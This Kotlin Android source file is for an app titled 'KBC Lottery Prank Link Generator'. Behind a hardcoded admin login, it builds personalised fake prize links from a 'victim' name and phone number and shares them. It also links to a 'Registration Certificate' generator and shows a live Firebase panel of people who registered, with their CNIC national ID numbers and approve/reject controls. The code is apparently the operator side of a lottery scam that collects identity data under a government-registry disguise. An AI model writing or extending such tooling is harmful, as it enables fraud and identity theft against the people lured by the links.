package com.example

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.core.app.NotificationCompat
import com.example.ui.theme.MyApplicationTheme
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import org.json.JSONArray
import org.json.JSONObject

// Data Models
data class LocalPrankModel(
    val id: Long,
    val victimName: String,
    val victimNumber: String,
    val generatedLink: String
)

data class GovtRegistryModel(
    val id: String = "",
    val userName: String = "",
    val cnicOrId: String = "",
    val status: String = "Pending",
    val timestamp: Long = 0L
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        createNotificationChannel()
        
        setContent {
            MyApplicationTheme {
                var isAuthenticated by remember { mutableStateOf(false) }
                
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    if (!isAuthenticated) {
                        LoginScreen(
                            modifier = Modifier.padding(innerPadding),
                            onLoginSuccess = { isAuthenticated = true }
                        )
                    } else {
                        KbcPrankApp(
                            modifier = Modifier.padding(innerPadding)
                        )
                    }
                }
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "govt_registry_channel",
                "Govt Registry Notifications",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Triggers when a new user registers on Vercel portal"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }
}

@Composable
fun LoginScreen(
    modifier: Modifier = Modifier,
    onLoginSuccess: () -> Unit
) {
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    val context = LocalContext.current

    Box(
        modifier = modifier
            .fillMaxSize()
            .background(Color(0xFFF5F7FB)),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(24.dp),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = Color.White),
            elevation = CardDefaults.cardElevation(defaultElevation = 4.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    text = "Admin Access",
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF1F2937)
                )
                Spacer(modifier = Modifier.height(24.dp))
                
                OutlinedTextField(
                    value = username,
                    onValueChange = { username = it },
                    label = { Text("ID") },
                    leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    shape = RoundedCornerShape(12.dp)
                )
                
                Spacer(modifier = Modifier.height(16.dp))

                OutlinedTextField(
                    value = password,
                    onValueChange = { password = it },
                    label = { Text("Password") },
                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                    modifier = Modifier.fillMaxWidth(),
                    visualTransformation = PasswordVisualTransformation(),
                    singleLine = true,
                    shape = RoundedCornerShape(12.dp)
                )

                Spacer(modifier = Modifier.height(24.dp))

                Button(
                    onClick = {
                        if (username.trim() == "jani681" && password == "kbc5800/") {
                            onLoginSuccess()
                        } else {
                            Toast.makeText(context, "Invalid ID or Password", Toast.LENGTH_SHORT).show()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E3A8A))
                ) {
                    Text("Login", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}

@Composable
fun KbcPrankApp(
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val realtimeDb = remember { FirebaseDatabase.getInstance().getReference("registrations") }
    val sharedPrefs = remember { context.getSharedPreferences("PrankPrefs", Context.MODE_PRIVATE) }
    
    var victimName by remember { mutableStateOf("") }
    var victimNumber by remember { mutableStateOf("") }
    var generatedLink by remember { mutableStateOf("") }
    var showSuccessDialog by remember { mutableStateOf(false) }
    
    var showRegistryScreen by remember { mutableStateOf(false) }

    val historyList = remember { mutableStateListOf<LocalPrankModel>() }
    val govtRegistryList = remember { mutableStateListOf<GovtRegistryModel>() }
    val processedDocIds = remember { mutableStateOf(setOf<String>()) }

    // Load Local History data from SharedPreferences securely
    LaunchedEffect(Unit) {
        val savedHistory = sharedPrefs.getString("history_data", null)
        if (!savedHistory.isNullOrBlank()) {
            try {
                val jsonArray = JSONArray(savedHistory)
                for (i in 0 until jsonArray.length()) {
                    val obj = jsonArray.getJSONObject(i)
                    historyList.add(LocalPrankModel(
                        obj.getLong("id"),
                        obj.getString("name"),
                        obj.getString("number"),
                        obj.getString("link")
                    ))
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    // Realtime Database Listener for Live User Tracking Panel
    LaunchedEffect(Unit) {
        realtimeDb.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val isFirstLoad = processedDocIds.value.isEmpty()
                val currentBatchIds = mutableSetOf<String>()
                
                govtRegistryList.clear()
                
                for (child in snapshot.children) {
                    try {
                        val id = child.key ?: ""
                        val uName = child.child("name").getValue(String::class.java) 
                            ?: child.child("userName").getValue(String::class.java) ?: ""
                        val cnic = child.child("cnic").getValue(String::class.java) 
                            ?: child.child("cnicOrId").getValue(String::class.java) ?: ""
                        val currentStatus = child.child("status").getValue(String::class.java) ?: "Pending"
                        val time = child.child("timestamp").getValue(Long::class.java) ?: 0L

                        currentBatchIds.add(id)
                        govtRegistryList.add(GovtRegistryModel(id, uName, cnic, currentStatus, time))

                        if (!isFirstLoad && !processedDocIds.value.contains(id) && currentStatus == "Pending") {
                            triggerLocalNotification(context, uName)
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
                govtRegistryList.sortByDescending { it.timestamp }
                processedDocIds.value = currentBatchIds
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("DATABASE_ERROR", error.message)
            }
        })
    }

    if (showRegistryScreen) {
        Column(
            modifier = modifier
                .fillMaxSize()
                .background(Color(0xFFF5F7FB))
                .padding(16.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically
            ) {
                IconButton(onClick = { showRegistryScreen = false }) {
                    Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                }
                Text(
                    text = "صارف پروفائل رجسٹری پینل",
                    fontSize = 18.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.padding(start = 8.dp)
                )
            }

            Spacer(modifier = Modifier.height(16.dp))

            if (govtRegistryList.isEmpty()) {
                Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
                    Text("No live registrations found in Realtime Database.", color = Color.Gray, textAlign = TextAlign.Center)
                }
            } else {
                LazyColumn(modifier = Modifier.fillMaxWidth().weight(1f), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                    items(govtRegistryList, key = { it.id }) { userEntry ->
                        GovtRegistryItemRow(
                            entry = userEntry,
                            onApprove = {
                                realtimeDb.child(userEntry.id).child("status").setValue("Approved")
                                    .addOnSuccessListener { Toast.makeText(context, "Approved!", Toast.LENGTH_SHORT).show() }
                            },
                            onReject = {
                                realtimeDb.child(userEntry.id).child("status").setValue("Rejected")
                                    .addOnSuccessListener { Toast.makeText(context, "Rejected!", Toast.LENGTH_SHORT).show() }
                            }
                        )
                    }
                }
            }
        }
    } else {
        Column(
            modifier = modifier
                .fillMaxSize()
                .background(Color(0xFFF5F7FB))
                .padding(16.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Card(
                modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E3A8A))
            ) {
                Column(
                    modifier = Modifier.padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(
                        text = "KBC Lottery Prank Link Generator",
                        color = Color.White,
                        fontSize = 20.sp,
                        fontWeight = FontWeight.Bold,
                        textAlign = TextAlign.Center
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = "Enter details to generate a working custom prize link",
                        color = Color.White.copy(alpha = 0.8f),
                        fontSize = 13.sp,
                        textAlign = TextAlign.Center
                    )
                }
            }

            Card(
                modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color.White),
                elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    OutlinedTextField(
                        value = victimName,
                        onValueChange = { victimName = it },
                        label = { Text("Victim Name") },
                        leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true,
                        shape = RoundedCornerShape(12.dp)
                    )
                    Spacer(modifier = Modifier.height(12.dp))
                    OutlinedTextField(
                        value = victimNumber,
                        onValueChange = { victimNumber = it },
                        label = { Text("Victim Phone Number") },
                        leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
                        modifier = Modifier.fillMaxWidth(),
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                        singleLine = true,
                        shape = RoundedCornerShape(12.dp)
                    )
                    Spacer(modifier = Modifier.height(16.dp))

                    Button(
                        onClick = {
                            if (victimName.isBlank() || victimNumber.isBlank()) {
                                Toast.makeText(context, "Please enter details", Toast.LENGTH_SHORT).show()
                            } else {
                                val baseSharedUrl = "https://kbc-lottery.vercel.app/"
                                val finalLink = "${baseSharedUrl}?name=${Uri.encode(victimName.trim())}&num=${Uri.encode(victimNumber.trim())}"
                                generatedLink = finalLink
                                showSuccessDialog = true
                                val timestampId = System.currentTimeMillis()

                                val newPrank = LocalPrankModel(timestampId, victimName.trim(), victimNumber.trim(), finalLink)
                                historyList.add(0, newPrank)

                                // Save locally to cache using simple string arrays
                                val jsonArray = JSONArray()
                                historyList.forEach {
                                    val obj = JSONObject().apply {
                                        put("id", it.id)
                                        put("name", it.victimName)
                                        put("number", it.victimNumber)
                                        put("link", it.generatedLink)
                                    }
                                    jsonArray.put(obj)
                                }
                                sharedPrefs.edit().putString("history_data", jsonArray.toString()).apply()
                            }
                        },
                        modifier = Modifier.fillMaxWidth().height(48.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2563EB))
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.Build, contentDescription = null)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Generate Prize Link")
                        }
                    }
                    Spacer(modifier = Modifier.height(8.dp))
                    Button(
                        onClick = {
                            context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/generator.html")))
                        },
                        modifier = Modifier.fillMaxWidth().height(48.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDC2626))
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.AccountBox, contentDescription = null)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Create Registration Certificate")
                        }
                    }
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Button(
                        onClick = { showRegistryScreen = true },
                        modifier = Modifier.fillMaxWidth().height(48.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0F172A))
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.List, contentDescription = null)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("(Registry) صارف پروفائل رجسٹری")
                        }
                    }
                }
            }

            Text("Generated Links History", fontWeight = FontWeight.Bold, color = Color.DarkGray, modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp))
            if (historyList.isEmpty()) {
                Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
                    Text("No history yet. Generated links will appear here.", color = Color.Gray)
                }
            } else {
                LazyColumn(modifier = Modifier.fillMaxWidth().weight(1f), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    items(historyList, key = { it.id }) { prank ->
                        HistoryItemRow(prank = prank, context = context)
                    }
                }
            }
        }
    }

    if (showSuccessDialog) {
        Dialog(onDismissRequest = { showSuccessDialog = false }) {
            Card(
                modifier = Modifier.fillMaxWidth().padding(16.dp),
                shape = RoundedCornerShape(20.dp),
                colors = CardDefaults.cardColors(containerColor = Color.White)
            ) {
                Column(modifier = Modifier.padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF10B981), modifier = Modifier.size(54.dp))
                    Spacer(modifier = Modifier.height(12.dp))
                    OutlinedTextField(value = generatedLink, onValueChange = {}, readOnly = true, modifier = Modifier.fillMaxWidth())
                    Spacer(modifier = Modifier.height(16.dp))
                    Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                        OutlinedButton(onClick = {
                            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                            clipboard.setPrimaryClip(ClipData.newPlainText("KBC Link", generatedLink))
                        }) { Text("Copy") }
                        Button(onClick = {
                            val intent = Intent(Intent.ACTION_SEND).apply { type = "text/plain"; putExtra(Intent.EXTRA_TEXT, generatedLink) }
                            context.startActivity(Intent.createChooser(intent, "Share via"))
                        }, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))) { Text("Share") }
                    }
                }
            }
        }
    }
}

@Composable
fun GovtRegistryItemRow(entry: GovtRegistryModel, onApprove: () -> Unit, onReject: () -> Unit) {
    val statusColor = when (entry.status) {
        "Approved" -> Color(0xFF10B981)
        "Rejected" -> Color(0xFFEF4444)
        else -> Color(0xFFF59E0B)
    }

    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
    ) {
        Row(
            modifier = Modifier.fillMaxWidth().padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(text = entry.userName, fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1F2937))
                Text(text = "ID/CNIC: ${entry.cnicOrId}", fontSize = 13.sp, color = Color.Gray)
                Spacer(modifier = Modifier.height(4.dp))
                Surface(color = statusColor.copy(alpha = 0.15f), shape = RoundedCornerShape(6.dp)) {
                    Text(text = entry.status, color = statusColor, fontSize = 11.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(horizontal = 8.dp, vertical = 2.dp))
                }
            }
            if (entry.status == "Pending") {
                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                    IconButton(onClick = onApprove) { Icon(Icons.Default.Check, contentDescription = "Approve", tint = Color(0xFF10B981)) }
                    IconButton(onClick = onReject) { Icon(Icons.Default.Close, contentDescription = "Reject", tint = Color(0xFFEF4444)) }
                }
            }
        }
    }
}

@Composable
fun HistoryItemRow(prank: LocalPrankModel, context: Context) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
    ) {
        Row(
            modifier = Modifier.fillMaxWidth().padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(text = prank.victimName, fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF1F2937))
                Text(text = prank.victimNumber, fontSize = 13.sp, color = Color.Gray)
                Spacer(modifier = Modifier.height(4.dp))
                Text(text = prank.generatedLink, fontSize = 11.sp, color = Color(0xFF2563EB), maxLines = 1, overflow = TextOverflow.Ellipsis)
            }
            IconButton(onClick = {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                clipboard.setPrimaryClip(ClipData.newPlainText("KBC Link", prank.generatedLink))
                Toast.makeText(context, "Copied!", Toast.LENGTH_SHORT).show()
            }) { Icon(Icons.Default.Share, contentDescription = "Copy", tint = Color(0xFF4B5563)) }
        }
    }
}

fun triggerLocalNotification(context: Context, name: String) {
    val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    val builder = NotificationCompat.Builder(context, "govt_registry_channel")
        .setSmallIcon(android.R.drawable.stat_notify_chat)
        .setContentTitle("Nayi Registration Aayi Hai!")
        .setContentText("$name ne portal par register kiya hai.")
        .setPriority(NotificationCompat.PRIORITY_HIGH)
        .setAutoCancel(true)
    notificationManager.notify(System.currentTimeMillis().toInt(), builder.build())
}
